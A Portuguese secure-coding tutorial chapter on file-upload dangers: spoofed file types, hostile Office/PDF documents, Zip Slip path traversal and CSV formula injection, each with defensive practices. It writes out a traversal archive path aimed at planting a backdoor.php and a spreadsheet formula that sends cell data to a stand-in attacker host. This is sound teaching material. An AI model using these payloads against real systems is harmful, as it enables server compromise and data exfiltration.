---
order: 13
---

# Upload de arquivos: validação, Zip Slip, CSV Injection

Aceitar um arquivo enviado pelo usuário (foto de perfil, comprovante, importação de dados) abre uma superfície de ataque à parte: ao contrário de um campo de texto, um arquivo tem um TIPO, um CONTEÚDO estruturado e um TAMANHO, cada um explorável de um jeito diferente. Este capítulo cobre as três armadilhas mais frequentes.

## Validar o tipo de um arquivo: nunca só pela extensão

O nome do arquivo e o cabeçalho `Content-Type` enviados pelo navegador durante um upload são informações fornecidas pelo CLIENTE, portanto falsificáveis como qualquer outro dado de uma requisição (veja o princípio já apresentado em [As grandes famílias de falhas de segurança](/?c=securite&s=cybersecurite&p=types-de-failles): nunca confiar em um dado externo sem validá-lo).

```text
Arquivo realmente enviado: script.php renomeado para foto.jpg
Cabeçalho Content-Type enviado pelo navegador: image/jpeg   (fácil de falsificar)
Extensão do nome do arquivo: .jpg                            (só um nome, não um conteúdo)

-> Se o servidor verifica SÓ a extensão/o Content-Type declarado,
   um arquivo executável pode se passar por uma imagem
```

| Verificação | Confiabilidade | O que ela impede |
|---|---|---|
| Extensão do nome do arquivo | Baixa: só um texto fornecido pelo cliente | Nada garantido sozinha |
| `Content-Type` declarado pelo navegador | Baixa: também fornecido pelo cliente | Nada garantido sozinho |
| Assinatura binária real do arquivo (*magic bytes*, primeiros bytes que identificam o formato verdadeiro) | Alta: lida no conteúdo, não declarada pelo cliente | Um executável disfarçado de imagem com uma extensão falsa |
| Arquivo guardado fora da pasta que o servidor web executa | Alta: mesmo que um arquivo malicioso passe mesmo assim, ele nunca poderá ser executado | Um script enviado executado diretamente ao acessar a sua URL |

> **Armadilha:** validar só a extensão ou o `Content-Type` declarado, ambos fornecidos pelo cliente e portanto falsificáveis sem esforço.
>
> **Boa prática:** verificar a assinatura binária real do conteúdo (biblioteca específica da linguagem usada), impor um tamanho máximo e guardar os arquivos enviados em uma pasta que o servidor web não saiba executar como código, qualquer que seja o resultado da validação.

## Arquivo especializado com armadilha (PDF, Excel, Word)

Um documento do Office (`.docx`, `.xlsx`) é na verdade um ARQUIVO zip que contém vários arquivos XML; um PDF é um formato de objetos aninhados, com sintaxe própria. Processar um arquivo assim (extração de texto, OCR, conversão) significa confiar em uma biblioteca de análise ESPECIALIZADA diante de um conteúdo possivelmente criado para explorá-la, além do simples caso "arquivo vazio ou truncado" já visto como caso-limite geral.

| Risco | O que ele explora |
|---|---|
| Bomba de descompressão interna | Um `.xlsx`/`.docx` é um zip: vale o mesmo princípio de uma [bomba de descompressão clássica](/?c=securite&s=cybersecurite&p=surcharge-et-deni-de-service-applicatif), escondido em um formato que à primeira vista não parece um arquivo compactado |
| Falha da biblioteca de análise diante de um documento malformado | Uma biblioteca de processamento de documentos (extração de PDF/OCR, leitura de Excel) não é feita em primeiro lugar para resistir a um conteúdo hostil; um documento malformado de propósito pode fazê-la travar e, em casos raros, revelar um comportamento não previsto pelos autores |
| Conteúdo ativo (macros, links externos) | Um documento do Office pode embutir uma macro executada na abertura; mesmo que o seu processamento automático nunca execute uma macro, um arquivo gerado a partir de um documento enviado (pré-visualização, conversão) que a conservasse a repassaria do jeito que está para quem o abrir depois |

> **Boa prática:** processar um documento enviado em um ambiente isolado se a biblioteca de análise usada não oferecer garantia forte de robustez (sandbox, limite de tempo/memória de execução); remover todo conteúdo ativo (macros) durante uma conversão em vez de conservá-lo por padrão.

## Zip Slip: um caminho com armadilha dentro de um arquivo compactado

Um arquivo compactado (`.zip`, `.tar`) que a aplicação extrai automaticamente (importação em massa, descompressão de um tema, envio de arquivos agrupados) contém uma lista de caminhos de arquivos internos, definidos por quem criou o arquivo. Um caminho criado para sair da pasta de destino prevista pode gravar em qualquer outro lugar do disco, se a extração não o verificar.

```text
Conteúdo esperado de uma entrada do arquivo:  images/foto.jpg
  -> extraído para: /var/www/uploads/images/foto.jpg   (dentro da pasta prevista)

Entrada com armadilha:  ../../../../var/www/html/backdoor.php
  -> se a ferramenta de extração segue esse caminho do jeito que está, o arquivo é gravado
     FORA da pasta de destino prevista, possivelmente em uma pasta
     EXECUTÁVEL pelo servidor web
```

O nome vem da ideia de um arquivo que "escorrega" (*slip*) para fora da pasta de destino durante a extração, exatamente o mesmo princípio da [travessia de diretórios](/?c=securite&s=cybersecurite&p=types-de-failles) (*path traversal*), aplicado desta vez a cada entrada de um arquivo compactado em vez de a um único nome de arquivo fornecido diretamente.

> **Armadilha:** extrair um arquivo compactado enviado com a função de descompressão padrão da linguagem, sem verificar que cada caminho de entrada continua dentro da pasta de destino prevista.
>
> **Boa prática:** antes de gravar cada arquivo extraído, verificar que o seu caminho final resolvido é mesmo um subcaminho da pasta de destino (rejeitar toda entrada que contenha `..` ou que se resolva fora dela), ou usar uma biblioteca de extração que já aplique essa verificação.

## CSV Injection: uma fórmula em vez de um simples dado

Um arquivo `.csv` gerado pela aplicação (exportação de dados, relatório) e destinado a ser aberto em uma planilha (Excel, Google Sheets) traz um risco próprio desse formato de destino: a planilha interpreta toda célula que começa com `=`, `+`, `-` ou `@` como uma FÓRMULA a calcular, e não como texto puro.

```text
Dado do usuário guardado do jeito que está:
  =HIPERLINK("http://atacante.example/roubo?c="&A1;"Clique aqui")

Exportação CSV do campo:
  =HIPERLINK("http://atacante.example/roubo?c="&A1;"Clique aqui")

Ao abrir o CSV no Excel: a célula mostra um link clicável "Clique aqui",
que na verdade envia o conteúdo de outra célula (A1) para um servidor do atacante
assim que é clicado; pior, algumas fórmulas são executadas SEM nem precisar de clique
```

Esse risco afeta qualquer dado do usuário exportado do jeito que está (apelido, comentário, nome de arquivo): nada no próprio formato CSV escapa esses caracteres; é somente a planilha que os interpreta assim na abertura.

> **Armadilha:** exportar um dado bruto do usuário em um CSV, pensando que um arquivo CSV "é só texto" e portanto não pode executar nada.
>
> **Boa prática:** colocar um apóstrofo (`'`) ou um espaço na frente de todo valor exportado que comece com `=`, `+`, `-` ou `@`, para que a planilha o mostre como texto puro em vez de interpretá-lo como uma fórmula.

---

## 📋 Recapitulando

| | |
|---|---|
| **Para lembrar** | Um arquivo enviado traz vários riscos diferentes de um campo de texto clássico: o seu tipo declarado (extensão/`Content-Type`) pode ser falsificado pelo cliente; um documento do Office/PDF é um formato estruturado com superfície de ataque própria; um arquivo compactado pode conter caminhos internos com armadilha (Zip Slip); uma exportação CSV reaberta em uma planilha pode conter fórmulas executáveis (CSV Injection). |
| **Ferramentas utilizáveis** | Detecção da assinatura binária real (biblioteca específica da linguagem); ambiente isolado para a análise de documentos estruturados; verificação do caminho resolvido antes de extrair um arquivo compactado; escape dos caracteres `=`/`+`/`-`/`@` no início de uma célula CSV. |
| **Armadilhas a evitar** | Validar um upload só pela extensão/`Content-Type` declarado. Tratar um documento do Office/PDF como um simples arquivo sem superfície de ataque própria. Extrair um arquivo compactado sem verificar que cada caminho continua na pasta prevista. Exportar um dado bruto do usuário em um CSV. |
| **Boas práticas** | Verificar a assinatura binária real, guardar fora de uma pasta executável, impor um tamanho máximo. Isolar a análise de um documento estruturado (sandbox, limite de recursos). Rejeitar todo caminho de arquivo compactado que saia da pasta de destino. Escapar toda célula CSV que comece com um caractere de fórmula. |
